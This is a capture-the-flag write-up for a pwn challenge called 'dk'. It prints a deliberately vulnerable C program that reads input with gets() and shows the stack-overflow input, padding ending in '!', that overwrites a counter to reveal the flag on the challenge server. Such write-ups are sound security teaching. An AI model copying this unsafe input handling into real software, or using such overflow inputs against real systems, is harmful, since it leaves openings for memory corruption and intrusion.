---
layout: post
date: 2019-03-26
title: dk
category: wtctf19
author: jedevc
---

### Challenge type

pwn

### Description

> i've made a brand new simulator that's impossible to win!
> ```
> nc challenge.whatthectf.afnom.net 4007 
> ```
> [dk.c](https://afnom.net/assets/ctf-files/wtctf19/dk.c), [dk](https://afnom.net/assets/ctf-files/wtctf19/dk)

### Challenge solve

After downloading the program, it's probably best to run it and see what it does.

First we can check what kind of program it is:

```
$ file dk
dk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b7f083a034d39b854be72960e27c593af9083664, not stripped
```

This is a linux executable for a x86-64 architecture, which most computers
nowadays have support for. So on a linux system:

```
$ ./dk
welcome to donkey kong simulator 2019
try to kill mario

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)
> 1

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)
> 2
i have 9 barrels for you

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)
> 3
mario has 91 health left

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)
> 1

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)
> 2
i have 8 barrels for you

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)
> 3
mario has 81 health left

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)
> 4
haha, knew you weren't a real donkey kong
```

At each stage the program gives us a choice of what to do:

1. throw a barrel, and decrease mario's health by 10
2. print out how many barrels are left
3. print out how much health mario has left
4. give up and quit

We can check the C program to ensure our guesses are correct.

```c
$ cat dk.c
#include <stdio.h>
#include <stdlib.h>

int health = 101;

int main() {
	unsigned int barrels = 10;
	char buffer[32];

	unsigned int choice;

	printf("welcome to donkey kong simulator 2019\n");
	printf("try to kill mario\n");

	while (barrels > 0) {
		printf("\n-------------------------\n");
		printf("what do you want to do?\n");
		printf("(1) throw a barrel\n");
		printf("(2) tell me how many barrels i have\n");
		printf("(3) tell me how much health mario has\n");
		printf("(4) give up :)\n");

		printf("> ");
		fflush(stdout);

		// gets is so easy to use
		gets(buffer);
		sscanf(buffer, "%u", &choice);

		switch (choice) {
			case 1:
				barrels--;
				health -= 10;
				break;
			case 2:
				printf("i have %u barrels for you\n", barrels);
				break;
			case 3:
				printf("mario has %d health left\n", health);
				break;
			case 4:
				printf("haha, knew you weren't a real donkey kong\n");
				return 0;
			default:
				// stop those bad hackerz
				printf("YOU'RE NOT ALLOWED TO DO THAT!!!");
				return 1;
		}
	}

	printf("you're out of barrels, sorry :(\n");

	if (health <= 0) {
		printf("you killed mario and won!\n");
		printf("here's your flag: ");
		system("/bin/cat flag.txt");
	}
}
```

By scanning this code over, we should immediately notice that this game is
indeed impossible to win - mario starts with 101 health, each barrel decreases
his health by 10 but we only start with 10 barrels, only enough to take away
100 health. And the only way to print out the flag, is to reduce the health
below 0 - seems impossible.

If we inspect the code further, we can see a call to
[gets](https://linux.die.net/man/3/gets), which we know is an
[unsafe](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used)
function as it reads into a buffer without checking it's length.

```c
gets(buffer);
```

This call may allow us to overwrite the buffer into other variables on the
stack - so what would we ideally like to overwrite? In a perfect world, we
could try and overwrite the `health` variable, but `health` is global, and so
is not actually stored on the stack. The other good choice looks like
`barrels` - if we can somehow trick the program into giving us more barrels,
then we can just throw them all.

So, what we do is we keep entering longer and longer input until we somehow get
more barrels. We can start counting from 32 characters, as the buffer will be at
least 32 characters long (as that's how it's been declared).

Eventually we get:

```
$ ./dk
welcome to donkey kong simulator 2019
try to kill mario

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)
> 2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
i have 0 barrels for you
you're out of barrels, sorry :(
```

We have to have the space in the payload so as to still allow the
[scanf](https://linux.die.net/man/3/scanf) to work. We've somehow overwritten
the barrel variable with the null byte, setting it to zero. If we just use one
more character then, we can overwrite the number of barrels to exactly what we
want. The lowest easily printable character is `!` with the ASCII value of 33.

```
welcome to donkey kong simulator 2019
try to kill mario

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)
> 2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
i have 33 barrels for you

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)
> 1

[...]

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)
> 1
you're out of barrels, sorry :(
you killed mario and won!
/bin/cat: flag.txt: No such file or directory
here's your flag:
```

Now that we've got to the function call to `system` and won the game, we can
try our exploit on the actual server, in exactly the same way.

```
$ nc challenge.whatthectf.afnom.net 4007 
welcome to donkey kong simulator 2019
try to kill mario

-------------------------
what do you want to do?
(1) throw a barrel
(2) tell me how many barrels i have
(3) tell me how much health mario has
(4) give up :)

[...]

you're out of barrels, sorry :(
you killed mario and won!
AFNOM{Y0U_GL1TCHED_ME_2_HARD}
here's your flag:
```
